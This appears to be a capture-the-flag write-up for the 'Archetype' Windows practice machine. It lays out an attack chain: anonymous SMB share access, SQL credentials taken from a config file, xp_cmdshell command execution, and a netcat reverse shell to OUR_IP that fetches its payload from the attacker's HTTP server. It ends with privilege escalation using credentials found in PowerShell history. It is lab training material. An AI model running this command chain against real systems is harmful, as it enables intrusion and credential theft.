# ARCHETYPE - Very Easy

**Date:** February 7, 2026  
**Difficulty:** Very Easy  
**Time Spent:** ~1-2 hours  
**Status:** ✅ PWNED

---

## Machine Overview

ARCHETYPE is a Windows-based machine that introduces fundamental concepts of Windows exploitation including SMB enumeration, MSSQL exploitation, and privilege escalation through credential discovery. This box demonstrates how misconfigurations in file shares and database services can lead to full system compromise.

---

## Key Concepts Learned

- Nmap scanning with service version detection
- SMB enumeration and share access
- MSSQL exploitation with Impacket
- xp_cmdshell command execution
- Reverse shell techniques on Windows
- Privilege escalation via credential discovery
- WinPEAS enumeration tool usage
- PSExec for administrative access

---

## Reconnaissance

### Service Enumeration
```bash
nmap -sC -sV TARGET_IP
```

**Findings:**
| Port | Service | Version |
|------|---------|---------|
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | Windows Server 2019 Standard 17763 |
| 1433 | ms-sql-s | Microsoft SQL Server 2017 14.00.1000.00 |

**Host Script Results:**
- SMB OS Discovery revealed target information
- SQL Server identified as primary attack vector

---

## Vulnerabilities Identified

### Vulnerability 1: Anonymous SMB Share Access
- **Type:** Information Disclosure
- **Port:** 445
- **Severity:** High
- **Impact:** Credential exposure via unprotected backup share
- **Discovery Method:** SMB enumeration

### Vulnerability 2: MSSQL xp_cmdshell Enabled
- **Type:** Remote Code Execution
- **Port:** 1433
- **Severity:** Critical
- **Impact:** Command execution on target system
- **Discovery Method:** SQL Server enumeration

### Vulnerability 3: Plaintext Credentials in PowerShell History
- **Type:** Information Disclosure
- **Severity:** Critical
- **Impact:** Administrator credential exposure
- **Discovery Method:** WinPEAS enumeration

---

## Exploitation Chain

### Phase 1: SMB Enumeration

**Step 1: List available shares**
```bash
smbclient -N -L \\\\TARGET_IP\\
```

**Shares Found:**
| Share | Type | Comment |
|-------|------|---------|
| ADMIN$ | Disk | Remote Admin |
| backups | Disk | (none) |
| C$ | Disk | Default Share |
| IPC$ | IPC | Remote IPC |

**Step 2: Access backups share (no authentication required)**
```bash
smbclient -N \\\\TARGET_IP\\backups
```

**Step 3: Download configuration file**
```bash
smb: \> get prod.dtsConfig
```

**Step 4: Extract credentials from config file**
```bash
cat prod.dtsConfig
```
- Found: SQL service account password and ID

---

### Phase 2: MSSQL Exploitation

**Step 1: Install Impacket**
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
```

**Step 2: Connect to MSSQL Server**
```bash
cd impacket/examples/
python3 mssqlclient.py ARCHETYPE/sql_svc@TARGET_IP -windows-auth
```
- Successfully authenticated - terminal shows `SQL>`

**Step 3: Check privileges**
```sql
SELECT is_srvrolemember('sysadmin');
```
- Output: `1` (True - we have sysadmin role)

**Step 4: Enable xp_cmdshell**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Step 5: Verify command execution**
```sql
xp_cmdshell "whoami"
```
- Output: `archetype\sql_svc`

---

### Phase 3: Reverse Shell

**Step 1: Setup listener and HTTP server on attack machine**
```bash
# Terminal 1 - HTTP server to serve nc64.exe
sudo python3 -m http.server 80

# Terminal 2 - Netcat listener
sudo nc -lvnp 443
```

**Step 2: Verify PowerShell access**
```sql
xp_cmdshell "powershell -c pwd"
```
- Output: `C:\Windows\system32`

**Step 3: Upload nc64.exe to target**
```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://OUR_IP/nc64.exe -outfile nc64.exe"
```
- Received `200` response on HTTP server - upload successful

> ⚠️ **IMPORTANT:** Ensure correct paths! The target path is `C:\Users\sql_svc\Downloads` and you must know the exact path to nc64.exe on your attack machine.

**Step 4: Execute reverse shell**
```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe OUR_IP 443"
```

**Step 5: Confirm access**
```cmd
C:\Users\sql_svc\Downloads> whoami
archetype\sql_svc
```

---

### Phase 4: User Flag

**Step 1: Navigate to Desktop**
```cmd
cd ..
cd Desktop
dir
```

**Step 2: Capture user flag**
```cmd
type user.txt
```
✅ **User Flag Captured!**

---

### Phase 5: Privilege Escalation

**Step 1: Switch to PowerShell**
```cmd
powershell
```
- Confirm with `PS` prefix in prompt

**Step 2: Upload WinPEAS**
```powershell
cd C:\Users\sql_svc\Downloads
wget http://OUR_IP/winPEASx64.exe -outfile winPEASx64.exe
```

> ⚠️ **IMPORTANT:** Must upload to Downloads folder - only directory with write access

**Step 3: Run WinPEAS**
```powershell
.\winPEASx64.exe
```

**Key Finding:**
- `ConsoleHost_history.txt` discovered (Windows equivalent of `.bash_history`)
- Path: `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\`

**Step 4: Read PowerShell history**
```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
- **Found:** Administrator username and password in plaintext!

---

### Phase 6: Administrator Access

**Step 1: Use PSExec from Impacket**
```bash
python3 psexec.py administrator@TARGET_IP
```
- Enter discovered password when prompted
- Shell as `NT AUTHORITY\SYSTEM`

**Step 2: Navigate to Administrator Desktop**
```cmd
cd C:\Users\Administrator\Desktop
dir
```

**Step 3: Capture root flag**
```cmd
type root.txt
```
✅ **Root Flag Captured!**

---

## Attack Summary

1. Nmap scan identified SMB (445) and MSSQL (1433) services
2. Enumerated SMB shares - found unprotected `backups` share
3. Downloaded `prod.dtsConfig` containing SQL credentials
4. Connected to MSSQL using Impacket's mssqlclient.py
5. Confirmed sysadmin privileges on SQL Server
6. Enabled xp_cmdshell for command execution
7. Uploaded nc64.exe via PowerShell wget
8. Established reverse shell as sql_svc
9. Captured user flag from Desktop
10. Ran WinPEAS for privilege escalation enumeration
11. Found admin credentials in PowerShell history file
12. Used PSExec to gain administrator shell
13. Captured root flag

---

## Key Techniques Used

- **Nmap:** Port scanning with service/version detection (-sC -sV)
- **SMBClient:** Share enumeration and file download
- **Impacket mssqlclient.py:** MSSQL authentication and interaction
- **xp_cmdshell:** SQL Server command execution
- **PowerShell wget:** File transfer to target
- **Netcat (nc64.exe):** Reverse shell establishment
- **WinPEAS:** Windows privilege escalation enumeration
- **Impacket psexec.py:** Remote administrative shell

---

## Tools Used

- Nmap (port scanning)
- SMBClient (share enumeration)
- Impacket (mssqlclient.py, psexec.py)
- Netcat/nc64.exe (reverse shell)
- Python HTTP server (file hosting)
- WinPEAS (privilege escalation)

---

## Lessons Learned

1. **SMB Shares Can Leak Credentials** - Unprotected backup shares are goldmines
2. **Configuration Files Often Contain Secrets** - Always check .config, .xml, .dtsConfig files
3. **MSSQL Can Execute System Commands** - xp_cmdshell is extremely dangerous when enabled
4. **Know Your File Paths** - Incorrect paths will break file transfers and shell execution
5. **Write Access Matters** - Find writable directories (like Downloads) for file uploads
6. **PowerShell History is Dangerous** - ConsoleHost_history.txt can expose credentials
7. **Impacket is Essential** - Master mssqlclient.py and psexec.py for Windows exploitation

---

## Pro Tips

- Keep a notes file open to track file paths and modify commands
- Always verify HTTP server receives requests (200 response)
- Use `-windows-auth` flag when connecting to domain-joined MSSQL
- WinPEAS output is extensive - look for highlighted findings
- PSExec provides SYSTEM-level access, not just Administrator

---

## References

- [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)
- [WinPEAS GitHub](https://github.com/carlospolop/PEASS-ng)

---

## Box Statistics

- **Difficulty:** Very Easy
- **Attack Complexity:** Moderate (multiple phases)
- **Skills Required:** SMB, MSSQL, Windows enumeration
- **Time to User:** ~30-45 minutes
- **Time to Root:** ~1-2 hours
- **Key Skill:** Windows service exploitation

---

## Notes

Excellent Windows introduction box! Covers the full attack chain from enumeration to root. The multiple tools (Impacket, WinPEAS) make this a great learning experience. Pay close attention to file paths - this was the biggest struggle point.

**Status:** BOX PWNED ✅
